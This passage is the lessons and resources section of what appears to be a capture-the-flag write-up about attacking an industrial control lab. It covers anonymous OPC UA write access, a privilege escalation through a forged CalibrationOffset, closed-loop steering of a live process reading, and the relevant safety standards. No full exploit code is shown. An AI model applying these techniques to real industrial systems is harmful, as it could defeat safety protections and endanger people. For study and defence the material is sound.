- **Anonymous OPC UA is two failures, not one.** `SecurityPolicy None` means an unsigned, unencrypted channel; an accepted `Anonymous` token means no user authentication. A server can fix either independently, and Helix fixed neither — so one `async with Client(url)` reached operating mode, test override, calibration data and the safety trip alike. Enumerate `UserAccessLevel` bit 1 on your own servers and see what an anonymous session can really write.
- **The deployed ACLs disagreed with the vendor's own drawing.** `Safety.RodsInserted` and `Safety.EmergencyCooling` are documented read-only and are writable in practice, while `Temperature`, `Pressure` and `TripActive` really are protected — so this was a specific misconfiguration, not a blanket one. Architecture diagrams describe intent; only enumeration describes reality, and the gap between them is where findings live.
- **A privilege decision must never read a value an attacker can write.** `helix-maint-console` grants root based on reported temperature, and reported temperature is raw plus `CalibrationOffset`, which is writable over an anonymous session. No reactor was heated — the sensor reading was forged. That is **CWE-807**, and it is the same mistake as trusting a hidden form field, just with a safety controller on the other end.
- **Drive the ramp off the reading, not the offset.** Offset 1 measured 285.31 °C on the failed run and 283.21 °C on the working one, so 13 is an artefact of that run's baseline rather than a constant. The naive loop only ever asked whether the trip had already fired; the working one reads `Temperature` back after every write and stops on the reading. Any exploit steering a live process into a narrow band has to close the loop on the measurement, because the same input lands somewhere different every time.
- **Safety and security are different standards, and Helix fails both.** IEC 61511 requires the safety instrumented system to be independent of the basic process control system, so one compromised path cannot take out both control and protection. ISA/IEC 62443 then asks for the SIS to be its own zone reachable only through an authenticated conduit. Here a single anonymous session on the application tier reached the safety controller. Getting the IT side right — put NiFi behind TLS with authentication, rotate the key — would not have fixed the part that actually matters.

---

## Resources

- [Apache NiFi — Security](https://nifi.apache.org/documentation/security/) — why command-executing processors are a feature, not a CVE
- [Rapid7 — apache_nifi_processor_rce](https://www.rapid7.com/db/modules/exploit/multi/http/apache_nifi_processor_rce/) — the create/start/stop/delete processor sequence
- [OPC UA Part 3 — AccessLevelType](https://reference.opcfoundation.org/Core/Part3/v105/docs/8.57) — CurrentRead is bit 0, CurrentWrite is bit 1
- [opcua-asyncio](https://opcua-asyncio.readthedocs.io/en/latest/) — the `asyncua` client used for every script here
- [CWE-807 — Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html) — the class the privesc belongs to
- [ISA/IEC 62443 series](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards) — zones, conduits and use control for industrial systems
- [MITRE ATT&CK for ICS — T0836 Modify Parameter](https://attack.mitre.org/techniques/T0836/) — the `CalibrationOffset` writes
- [MITRE ATT&CK for ICS — T0832 Manipulation of View](https://attack.mitre.org/techniques/T0832/) — the false temperature the safety controller consumed
- Hack The Box — retired machines archive
